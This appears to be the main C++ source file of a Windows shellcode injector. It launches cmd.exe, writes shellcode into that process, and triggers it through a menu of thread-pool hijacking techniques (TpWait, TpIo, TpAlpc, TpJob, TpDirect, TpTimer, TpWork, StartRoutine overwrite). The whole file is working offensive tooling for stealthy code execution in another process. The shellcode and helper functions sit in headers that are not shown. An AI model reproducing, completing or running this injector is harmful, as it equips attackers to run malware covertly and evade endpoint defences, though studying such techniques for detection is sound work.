#include "shellcode.h"
#include "Functions.h"

using namespace std;

int main(int argc, char *argv[]) {
	if ((argc < 2) || (argv[1] == "/?") || (argc > 2)) {
		cout << "Usage: injector.exe [/TpWait | /TpIo | /TpAlpc | /TpJob | /TpDirect | /TpTimer | /TpWork | /StartRoutine]" << endl;
		return 0;
	}
	
	/*
	if (AdjustToken() == FALSE) {
		cerr << "[-]Get SeDebug Priviledge Failed, Run as admin may help." << endl;
		return -1;
	}
	*/
	WCHAR HostProcess[] = L"C:\\Windows\\System32\\cmd.exe";
	LPSTARTUPINFOW startinf = new STARTUPINFOW();
	LPPROCESS_INFORMATION procinf = new PROCESS_INFORMATION();
	if (!CreateProcessW(NULL, HostProcess, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, startinf, procinf)) {
		std::cerr << "[X]Failed to Create Process." << std::endl;
		return -2;
	}
	std::cout << "[O]Create Process success. PID: " << procinf->dwProcessId << std::endl;
	HANDLE hProcess = procinf->hProcess;

	SIZE_T shellcodesize = sizeof(shellcode);
	PVOID shellcodeaddress = ShellcodeInject(hProcess, shellcode, shellcodesize);
	if (shellcodeaddress == NULL) {
		cerr << "[-]Failed to inject shellcode" << endl;
		CloseHandle(hProcess);
		return -3;
	}
	Sleep(1000);
	
	if (argc == 2 && strcmp(argv[1], "/TpWait") == 0) {
		HANDLE hIoCompletion = HijackThreadPoolRelatedHandle(L"IoCompletion", hProcess, IO_COMPLETION_ALL_ACCESS);
		if (hIoCompletion == NULL) {
			cerr << "[-]Failed to retrieve IoCompletion. " << GetLastError() << endl;
			CloseHandle(hProcess);
			return -4;
		}
		if (TpWaitInsert(shellcodeaddress, hProcess, hIoCompletion) == FALSE) {
			cerr << "[-]Failed to Insert TpWait " << GetLastError() << endl;
			CloseHandle(hIoCompletion);
			CloseHandle(hProcess);
			return -5;
		}
		CloseHandle(hIoCompletion);
		CloseHandle(hProcess);
		cout << "[+]Done!" << endl;
		return 0;
	}

	if (argc == 2 && strcmp(argv[1], "/TpIo") == 0) {
		HANDLE hIoCompletion = HijackThreadPoolRelatedHandle(L"IoCompletion", hProcess, IO_COMPLETION_ALL_ACCESS);
		if (hIoCompletion == NULL) {
			cerr << "[-]Failed to retrieve IoCompletion. " << GetLastError() << endl;
			CloseHandle(hProcess);
			return -4;
		}
		if (TpIoInsert(shellcodeaddress, hProcess, hIoCompletion) == FALSE) {
			cerr << "[-]Failed to Insert TpIo " << GetLastError() << endl;
			CloseHandle(hIoCompletion);
			CloseHandle(hProcess);
			return -5;
		}
		CloseHandle(hIoCompletion);
		CloseHandle(hProcess);
		cout << "[+]Done!" << endl;
		return 0;
	}

	if (argc == 2 && strcmp(argv[1], "/TpAlpc") == 0) {
		HANDLE hIoCompletion= HijackThreadPoolRelatedHandle(L"IoCompletion", hProcess, IO_COMPLETION_ALL_ACCESS);
		if (hIoCompletion == NULL) {
			cerr << "[-]Failed to retrieve IoCompletion. " << GetLastError() << endl;
			CloseHandle(hProcess);
			return -4;
		}
		if (TpAlpcInsert(shellcodeaddress, hProcess, hIoCompletion) == FALSE) {
			cerr << "[-]Failed to Insert TpAlpc " << GetLastError() << endl;
			CloseHandle(hIoCompletion);
			CloseHandle(hProcess);
			return -5;
		}
		CloseHandle(hIoCompletion);
		CloseHandle(hProcess);
		cout << "[+]Done!" << endl;
		return 0;
	}

	if (argc == 2 && strcmp(argv[1], "/TpJob") == 0) {
		HANDLE hIoCompletion = HijackThreadPoolRelatedHandle(L"IoCompletion", hProcess, IO_COMPLETION_ALL_ACCESS);
		if (hIoCompletion == NULL) {
			cerr << "[-]Failed to retrieve IoCompletion. " << GetLastError() << endl;
			CloseHandle(hProcess);
			return -4;
		}
		if (TpJobInsert(shellcodeaddress, hProcess, hIoCompletion) == FALSE) {
			cerr << "[-]Failed to Insert TpJob " << GetLastError() << endl;
			CloseHandle(hIoCompletion);
			CloseHandle(hProcess);
			return -5;
		}
		CloseHandle(hIoCompletion);
		CloseHandle(hProcess);
		cout << "[+]Done!" << endl;
		return 0;
	}

	if (argc == 2 && strcmp(argv[1], "/TpDirect") == 0) {
		HANDLE hIoCompletion = HijackThreadPoolRelatedHandle(L"IoCompletion", hProcess, IO_COMPLETION_ALL_ACCESS);
		if (hIoCompletion == NULL) {
			cerr << "[-]Failed to retrieve IoCompletion. " << GetLastError() << endl;
			CloseHandle(hProcess);
			return -4;
		}
		if (TpDirectInsert(shellcodeaddress, hProcess, hIoCompletion) == FALSE) {
			cerr << "[-]Failed to Insert TpDirect." << GetLastError() << endl;
			CloseHandle(hIoCompletion);
			CloseHandle(hProcess);
			return -5;
		}
		CloseHandle(hIoCompletion);
		CloseHandle(hProcess);
		cout << "[+]Done!" << endl;
		return 0;
	}

	if (argc == 2 && strcmp(argv[1], "/TpTimer") == 0) {
		HANDLE hWorkerFactory = HijackThreadPoolRelatedHandle(L"TpWorkerFactory", hProcess, WORKER_FACTORY_ALL_ACCESS);
		if (hWorkerFactory == NULL) {
			cerr << "[-]Failed to retrieve WorkerFactory. " << GetLastError() << endl;
			CloseHandle(hProcess);
			return -4;
		}
		HANDLE hTpTimer = HijackThreadPoolRelatedHandle(L"IRTimer", hProcess, TIMER_ALL_ACCESS);
		if (hTpTimer == NULL) {
			cerr << "[-]Failed to retrieve IRTimer. " << GetLastError() << endl;
			CloseHandle(hWorkerFactory);
			CloseHandle(hProcess);
			return -4;
		}
		if (TpTimerInsert(shellcodeaddress, hProcess, hWorkerFactory, hTpTimer) == FALSE) {
			cerr << "[-]Failed to Insert TpTimer. " << GetLastError() << endl;
			CloseHandle(hTpTimer);
			CloseHandle(hWorkerFactory);
			CloseHandle(hProcess);
			return -5;
		}
		cout << "[+]Done!" << endl;
		CloseHandle(hTpTimer);
		CloseHandle(hWorkerFactory);
		CloseHandle(hProcess);
		return 0;
	}

	if (argc == 2 && strcmp(argv[1], "/StartRoutine") == 0) {
		HANDLE hWorkerFactory = HijackThreadPoolRelatedHandle(L"TpWorkerFactory", hProcess, WORKER_FACTORY_ALL_ACCESS);
		if (hWorkerFactory == NULL) {
			cerr << "[-]Failed to retrieve WorkerFactory. " << GetLastError() << endl;
			CloseHandle(hProcess);
			return -4;
		}
		if (StartRoutineOverwrite(shellcodeaddress, hProcess, hWorkerFactory) == FALSE) {
			cerr << "[-]Failed to Overwrite StartRoutine " << GetLastError() << endl;
			CloseHandle(hWorkerFactory);
			CloseHandle(hProcess);
			return -5;
		}
		cout << "[+]Done!" << endl;
		CloseHandle(hWorkerFactory);
		CloseHandle(hProcess);
		return 0;
	}

	if (argc == 2 && strcmp(argv[1], "/TpWork") == 0) {
		HANDLE hWorkerFactory = HijackThreadPoolRelatedHandle(L"TpWorkerFactory", hProcess, WORKER_FACTORY_ALL_ACCESS);
		if (hWorkerFactory == NULL) {
			cerr << "[-]Failed to retrieve WorkerFactory. " << GetLastError() << endl;
			CloseHandle(hProcess);
			return -4;
		}
		if (TpWorkInsert(shellcodeaddress, hProcess, hWorkerFactory) == FALSE) {
			cerr << "[-]Failed to insert TpWork " << GetLastError() << endl;
			CloseHandle(hWorkerFactory);
			CloseHandle(hProcess);
			return -5;
		}
		cout << "[+]Done! Please wait for execution!" << endl;
		CloseHandle(hWorkerFactory);
		CloseHandle(hProcess);
		return 0;
	}
	else {
		cerr << "[-]Invalid Parameter! Please run *.exe /? for help." << endl;
		CloseHandle(hProcess);
		return -10;
	}
}